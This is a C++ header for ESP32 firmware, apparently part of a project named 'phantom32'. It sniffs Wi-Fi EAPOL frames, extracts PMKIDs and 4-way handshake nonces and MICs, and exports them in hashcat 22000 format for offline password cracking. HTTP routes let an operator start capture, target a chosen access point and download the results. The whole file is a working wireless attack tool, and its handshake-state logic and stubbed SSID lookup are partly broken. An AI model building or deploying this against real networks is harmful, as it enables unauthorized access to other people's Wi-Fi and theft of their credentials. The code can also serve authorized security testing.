#pragma once
// pmkid_extractor.h — Enhanced PMKID and 4-way handshake capture engine.
// Extracts PMKID from EAPOL Message 1, captures full 4-way handshake,
// exports to hashcat/hcxtools compatible format.
// Prefix: pmk_

#include <Arduino.h>
#include <WebServer.h>
#include <LittleFS.h>
#include <esp_wifi.h>

extern WebServer server;

// ─── Constants ────────────────────────────────────────────────────────────────
#define PMK_MAX_ENTRIES 32
#define PMK_MAX_SSID_LEN 33
#define PMK_PMKID_LEN 16
#define PMK_MIC_LEN 16
#define PMK_NONCE_LEN 32
#define PMK_REPLAY_CTR 8
#define PMK_KCK_LEN 16
#define PMK_KEK_LEN 16
#define PMK_PTK_LEN 48
#define EAPOL_VERSION 1
#define EAPOL_TYPE_KEY 3
#define WPA_KEY_INFO_MIC 0x0100
#define WPA_KEY_INFO_ACK 0x0080
#define WPA_KEY_INFO_INSTALL 0x0040
#define WPA_KEY_INFO_PAIRWISE 0x0008

// ─── Structs ──────────────────────────────────────────────────────────────────
struct PmkEapolKey {
  uint8_t version;         // 802.1X version
  uint8_t type;            // 3 = EAPOL-Key
  uint16_t length;         // payload length (big-endian)
  uint8_t key_descriptor;  // 0x02 = RSN
  uint16_t key_info;       // key information flags (big-endian)
  uint16_t key_len;        // pairwise key length
  uint8_t replay_counter[PMK_REPLAY_CTR];
  uint8_t key_nonce[PMK_NONCE_LEN];
  uint8_t key_iv[16];
  uint8_t key_rsc[8];
  uint8_t key_id[8];
  uint8_t key_mic[PMK_MIC_LEN];
  uint16_t key_data_len;
  uint8_t key_data[256];
} __attribute__((packed));

struct PmkEntry {
  bool active;
  uint8_t bssid[6];
  uint8_t client[6];
  char ssid[PMK_MAX_SSID_LEN];
  uint8_t pmkid[PMK_PMKID_LEN];
  bool has_pmkid;
  // 4-way handshake state
  uint8_t msg1_nonce[PMK_NONCE_LEN];  // ANonce
  uint8_t msg2_nonce[PMK_NONCE_LEN];  // SNonce
  uint8_t msg2_mic[PMK_MIC_LEN];
  uint8_t msg2_eapol[256];
  uint16_t msg2_eapol_len;
  uint8_t replay_ctr[PMK_REPLAY_CTR];
  int handshake_state;  // 0=none 1=msg1 2=msg2 3=msg3 4=complete
  uint32_t first_seen;
  uint32_t last_seen;
  int8_t rssi;
  uint32_t frame_count;
};

struct PmkStats {
  uint32_t total_eapol;
  uint32_t pmkid_captured;
  uint32_t handshakes_complete;
  uint32_t handshakes_partial;
  uint32_t last_capture_ts;
};

// ─── State ───────────────────────────────────────────────────────────────────
static struct {
  PmkEntry entries[PMK_MAX_ENTRIES];
  PmkStats stats;
  bool active;
  uint8_t target_bssid[6];
  bool targeting;
} g_pmk = {};

// ─── Helpers ──────────────────────────────────────────────────────────────────
static inline uint16_t pmk_be16(const uint8_t *p) {
  return ((uint16_t)p[0] << 8) | p[1];
}
static inline uint32_t pmk_be32(const uint8_t *p) {
  return ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) | ((uint32_t)p[2] << 8) | p[3];
}

static bool pmk_mac_eq(const uint8_t *a, const uint8_t *b) {
  return memcmp(a, b, 6) == 0;
}

static bool pmk_mac_zero(const uint8_t *m) {
  return !m[0] && !m[1] && !m[2] && !m[3] && !m[4] && !m[5];
}

static void pmk_mac_str(const uint8_t *m, char *out) {
  snprintf(out, 18, "%02X:%02X:%02X:%02X:%02X:%02X", m[0], m[1], m[2], m[3], m[4], m[5]);
}

static void pmk_hex_str(const uint8_t *d, int len, char *out) {
  for (int i = 0; i < len; i++) {
    snprintf(out + i * 2, 3, "%02x", d[i]);
  }
}

// ─── Find or create entry ─────────────────────────────────────────────────────
static PmkEntry *pmk_find(const uint8_t *bssid, const uint8_t *client) {
  for (int i = 0; i < PMK_MAX_ENTRIES; i++) {
    PmkEntry &e = g_pmk.entries[i];
    if (e.active && pmk_mac_eq(e.bssid, bssid) && pmk_mac_eq(e.client, client))
      return &e;
  }
  return nullptr;
}

static PmkEntry *pmk_alloc(const uint8_t *bssid, const uint8_t *client) {
  // Replace oldest inactive slot
  for (int i = 0; i < PMK_MAX_ENTRIES; i++) {
    if (!g_pmk.entries[i].active) {
      PmkEntry &e = g_pmk.entries[i];
      memset(&e, 0, sizeof(e));
      memcpy(e.bssid, bssid, 6);
      memcpy(e.client, client, 6);
      e.active = true;
      e.first_seen = millis() / 1000;
      return &e;
    }
  }
  // Evict oldest complete entry
  PmkEntry *oldest = nullptr;
  for (int i = 0; i < PMK_MAX_ENTRIES; i++) {
    PmkEntry &e = g_pmk.entries[i];
    if (!oldest || e.first_seen < oldest->first_seen)
      oldest = &e;
  }
  if (oldest) {
    memset(oldest, 0, sizeof(*oldest));
    memcpy(oldest->bssid, bssid, 6);
    memcpy(oldest->client, client, 6);
    oldest->active = true;
    oldest->first_seen = millis() / 1000;
    return oldest;
  }
  return nullptr;
}

// ─── SSID lookup from AP table ────────────────────────────────────────────────
static void pmk_lookup_ssid(const uint8_t *bssid, char *ssid_out) {
  ssid_out[0] = '\0';
  // Delegate to scan results API; for now leave blank
}

// ─── PMKID extraction from key data IEs ───────────────────────────────────────
// PMKID is in RSN IE within key_data: OUI 00-0F-AC type 4 (PMKID list)
static bool pmk_extract_pmkid(const uint8_t *key_data, uint16_t key_data_len, uint8_t *pmkid_out) {
  // Walk IEs
  uint16_t i = 0;
  while (i + 2 <= key_data_len) {
    uint8_t eid = key_data[i];
    uint8_t elen = key_data[i + 1];
    if (i + 2 + elen > key_data_len)
      break;
    if (eid == 48 && elen >= 20) {  // RSN IE
      const uint8_t *rsn = key_data + i + 2;
      uint16_t pos = 2;  // skip version
      if (pos + 4 > elen) {
        i += 2 + elen;
        continue;
      }
      pos += 4;  // group cipher
      uint16_t pcs = pmk_be16(rsn + pos);
      pos += 2 + pcs * 4;
      if (pos + 2 > elen) {
        i += 2 + elen;
        continue;
      }
      uint16_t akm_cnt = pmk_be16(rsn + pos);
      pos += 2 + akm_cnt * 4;
      if (pos + 2 > elen) {
        i += 2 + elen;
        continue;
      }
      pos += 2;  // RSN caps
      if (pos + 2 > elen) {
        i += 2 + elen;
        continue;
      }
      uint16_t pmkid_cnt = pmk_be16(rsn + pos);
      pos += 2;
      if (pmkid_cnt > 0 && pos + PMK_PMKID_LEN <= elen) {
        memcpy(pmkid_out, rsn + pos, PMK_PMKID_LEN);
        return true;
      }
    }
    i += 2 + elen;
  }
  return false;
}

// ─── Ingest raw EAPOL frame ───────────────────────────────────────────────────
// Called from promiscuous callback when frame is detected as EAPOL.
// raw: pointer past LLC header to EAPOL payload.
// bssid/src/dst: 6-byte MAC addresses.
void pmk_ingest_eapol(const uint8_t *raw, int raw_len, const uint8_t *bssid, const uint8_t *src,
                      const uint8_t *dst, int8_t rssi) {
  if (!g_pmk.active)
    return;
  if (raw_len < 4)
    return;

  uint8_t eapol_ver = raw[0];
  uint8_t eapol_type = raw[1];
  uint16_t eapol_len = pmk_be16(raw + 2);

  if (eapol_type != EAPOL_TYPE_KEY)
    return;
  if (eapol_len < (int)sizeof(PmkEapolKey) - 256)
    return;

  g_pmk.stats.total_eapol++;

  const PmkEapolKey *ek = (const PmkEapolKey *)(raw);
  uint16_t key_info = pmk_be16((const uint8_t *)&ek->key_info);
  uint16_t key_data_len = pmk_be16((const uint8_t *)&ek->key_data_len);
  bool is_pairwise = (key_info & WPA_KEY_INFO_PAIRWISE) != 0;
  bool has_mic = (key_info & WPA_KEY_INFO_MIC) != 0;
  bool has_ack = (key_info & WPA_KEY_INFO_ACK) != 0;

  if (!is_pairwise)
    return;

  // Determine direction: AP→STA = src is bssid; STA→AP = dst is bssid
  bool ap_to_sta = pmk_mac_eq(src, bssid);

  const uint8_t *client_mac = ap_to_sta ? dst : src;

  // Skip targeting if set and doesn't match
  if (g_pmk.targeting && !pmk_mac_eq(bssid, g_pmk.target_bssid))
    return;

  PmkEntry *e = pmk_find(bssid, client_mac);
  if (!e)
    e = pmk_alloc(bssid, client_mac);
  if (!e)
    return;

  e->last_seen = millis() / 1000;
  e->rssi = rssi;
  e->frame_count++;

  if (e->ssid[0] == '\0')
    pmk_lookup_ssid(bssid, e->ssid);

  // Message 1: AP→STA, has_ack=1, has_mic=0 → ANonce
  if (ap_to_sta && has_ack && !has_mic) {
    memcpy(e->msg1_nonce, ek->key_nonce, PMK_NONCE_LEN);
    memcpy(e->replay_ctr, ek->replay_counter, PMK_REPLAY_CTR);
    e->handshake_state = 1;

    // Extract PMKID from key_data if present
    if (key_data_len >= PMK_PMKID_LEN + 4) {
      uint8_t pmkid[PMK_PMKID_LEN];
      if (pmk_extract_pmkid(ek->key_data, key_data_len, pmkid)) {
        memcpy(e->pmkid, pmkid, PMK_PMKID_LEN);
        e->has_pmkid = true;
        g_pmk.stats.pmkid_captured++;
        g_pmk.stats.last_capture_ts = millis() / 1000;
      }
    }
  }

  // Message 2: STA→AP, has_mic=1, has_ack=0 → SNonce + MIC
  if (!ap_to_sta && has_mic && !has_ack && e->handshake_state == 1) {
    memcpy(e->msg2_nonce, ek->key_nonce, PMK_NONCE_LEN);
    memcpy(e->msg2_mic, ek->key_mic, PMK_MIC_LEN);
    int copy_len = min(raw_len, 256);
    memcpy(e->msg2_eapol, raw, copy_len);
    e->msg2_eapol_len = copy_len;
    e->handshake_state = 2;
    g_pmk.stats.handshakes_partial++;
  }

  // Message 3: AP→STA, has_ack=1, has_mic=1 → install flag
  if (ap_to_sta && has_ack && has_mic && e->handshake_state == 2) {
    e->handshake_state = 3;
  }

  // Message 4: STA→AP, has_mic=1, has_ack=0, install=0
  if (!ap_to_sta && has_mic && !has_ack && e->handshake_state == 3) {
    e->handshake_state = 4;
    g_pmk.stats.handshakes_complete++;
    g_pmk.stats.last_capture_ts = millis() / 1000;
  }
}

// ─── Export to hcxpcapng-compatible format ────────────────────────────────────
// Writes hashcat 22000 format: TYPE*CLIENT*AP*SSID_HEX*NONCE*EAPOL*MIC
static String pmk_export_hc22000() {
  String out;
  for (int i = 0; i < PMK_MAX_ENTRIES; i++) {
    PmkEntry &e = g_pmk.entries[i];
    if (!e.active)
      continue;

    char client_str[18], bssid_str[18], ssid_hex[PMK_MAX_SSID_LEN * 2 + 1];
    pmk_mac_str(e.client, client_str);
    pmk_mac_str(e.bssid, bssid_str);

    // Convert SSID to hex
    int ssid_len = strlen(e.ssid);
    for (int j = 0; j < ssid_len; j++) {
      snprintf(ssid_hex + j * 2, 3, "%02x", (uint8_t)e.ssid[j]);
    }
    ssid_hex[ssid_len * 2] = '\0';

    if (e.has_pmkid) {
      char pmkid_hex[PMK_PMKID_LEN * 2 + 1];
      pmk_hex_str(e.pmkid, PMK_PMKID_LEN, pmkid_hex);
      // hashcat mode 22000 PMKID: WPA*01*PMKID*AP_MAC*CLIENT_MAC*ESSID_HEX
      char client_no_colon[13], bssid_no_colon[13];
      for (int j = 0, k = 0; j < 18; j++)
        if (client_str[j] != ':')
          client_no_colon[k++] = tolower(client_str[j]);
      client_no_colon[12] = '\0';
      for (int j = 0, k = 0; j < 18; j++)
        if (bssid_str[j] != ':')
          bssid_no_colon[k++] = tolower(bssid_str[j]);
      bssid_no_colon[12] = '\0';
      out += "WPA*01*";
      out += pmkid_hex;
      out += "*";
      out += bssid_no_colon;
      out += "*";
      out += client_no_colon;
      out += "*";
      out += ssid_hex;
      out += "***\n";
    }

    if (e.handshake_state >= 2) {
      char anonce_hex[PMK_NONCE_LEN * 2 + 1];
      char snonce_hex[PMK_NONCE_LEN * 2 + 1];
      char mic_hex[PMK_MIC_LEN * 2 + 1];
      char eapol_hex[512 + 1];
      pmk_hex_str(e.msg1_nonce, PMK_NONCE_LEN, anonce_hex);
      pmk_hex_str(e.msg2_nonce, PMK_NONCE_LEN, snonce_hex);
      pmk_hex_str(e.msg2_mic, PMK_MIC_LEN, mic_hex);
      int elen = min((int)e.msg2_eapol_len, 256);
      pmk_hex_str(e.msg2_eapol, elen, eapol_hex);

      char client_no_colon[13], bssid_no_colon[13];
      for (int j = 0, k = 0; j < 18; j++)
        if (client_str[j] != ':')
          client_no_colon[k++] = tolower(client_str[j]);
      client_no_colon[12] = '\0';
      for (int j = 0, k = 0; j < 18; j++)
        if (bssid_str[j] != ':')
          bssid_no_colon[k++] = tolower(bssid_str[j]);
      bssid_no_colon[12] = '\0';

      out += "WPA*02*";
      out += mic_hex;
      out += "*";
      out += bssid_no_colon;
      out += "*";
      out += client_no_colon;
      out += "*";
      out += ssid_hex;
      out += "*";
      out += anonce_hex;
      out += "*";
      out += eapol_hex;
      out += "*00\n";
    }
  }
  return out;
}

// ─── JSON status ─────────────────────────────────────────────────────────────
static String pmk_json_status() {
  String s = "{\"active\":";
  s += g_pmk.active ? "true" : "false";
  s += ",\"total_eapol\":" + String(g_pmk.stats.total_eapol);
  s += ",\"pmkid_captured\":" + String(g_pmk.stats.pmkid_captured);
  s += ",\"handshakes_complete\":" + String(g_pmk.stats.handshakes_complete);
  s += ",\"handshakes_partial\":" + String(g_pmk.stats.handshakes_partial);
  s += ",\"entries\":[";
  bool first = true;
  char mac1[18], mac2[18], pmkid_hex[PMK_PMKID_LEN * 2 + 1];
  for (int i = 0; i < PMK_MAX_ENTRIES; i++) {
    PmkEntry &e = g_pmk.entries[i];
    if (!e.active)
      continue;
    if (!first)
      s += ",";
    first = false;
    pmk_mac_str(e.bssid, mac1);
    pmk_mac_str(e.client, mac2);
    pmk_hex_str(e.pmkid, PMK_PMKID_LEN, pmkid_hex);
    s += "{\"bssid\":\"" + String(mac1) + "\"";
    s += ",\"client\":\"" + String(mac2) + "\"";
    s += ",\"ssid\":\"" + String(e.ssid) + "\"";
    s += ",\"has_pmkid\":" + String(e.has_pmkid ? "true" : "false");
    if (e.has_pmkid)
      s += ",\"pmkid\":\"" + String(pmkid_hex) + "\"";
    s += ",\"hs_state\":" + String(e.handshake_state);
    s += ",\"rssi\":" + String(e.rssi);
    s += ",\"frames\":" + String(e.frame_count);
    s += ",\"last_seen\":" + String(e.last_seen);
    s += "}";
  }
  s += "]}";
  return s;
}

// ─── Control ─────────────────────────────────────────────────────────────────
inline void pmk_start() {
  g_pmk.active = true;
  g_pmk.targeting = false;
}
inline void pmk_stop() {
  g_pmk.active = false;
}
inline void pmk_clear() {
  memset(&g_pmk.entries, 0, sizeof(g_pmk.entries));
  memset(&g_pmk.stats, 0, sizeof(g_pmk.stats));
}

inline void pmk_set_target(const uint8_t *bssid) {
  memcpy(g_pmk.target_bssid, bssid, 6);
  g_pmk.targeting = true;
}

// ─── Routes ──────────────────────────────────────────────────────────────────
inline void pmk_routes() {
  server.on("/api/pmk/status", HTTP_GET,
            []() { server.send(200, "application/json", pmk_json_status()); });

  server.on("/api/pmk/start", HTTP_POST, []() {
    pmk_start();
    server.send(200, "application/json", "{\"ok\":true}");
  });

  server.on("/api/pmk/stop", HTTP_POST, []() {
    pmk_stop();
    server.send(200, "application/json", "{\"ok\":true}");
  });

  server.on("/api/pmk/clear", HTTP_POST, []() {
    pmk_clear();
    server.send(200, "application/json", "{\"ok\":true}");
  });

  server.on("/api/pmk/export", HTTP_GET, []() {
    server.sendHeader("Content-Disposition", "attachment; filename=phantom32.hc22000");
    server.send(200, "text/plain", pmk_export_hc22000());
  });

  server.on("/api/pmk/target", HTTP_POST, []() {
    if (!server.hasArg("bssid")) {
      server.send(400, "application/json", "{\"error\":\"missing bssid\"}");
      return;
    }
    String bssid = server.arg("bssid");
    uint8_t mac[6];
    sscanf(bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &mac[0], &mac[1], &mac[2], &mac[3],
           &mac[4], &mac[5]);
    pmk_set_target(mac);
    server.send(200, "application/json", "{\"ok\":true}");
  });

  server.on("/api/pmk/entries", HTTP_GET,
            []() { server.send(200, "application/json", pmk_json_status()); });
}
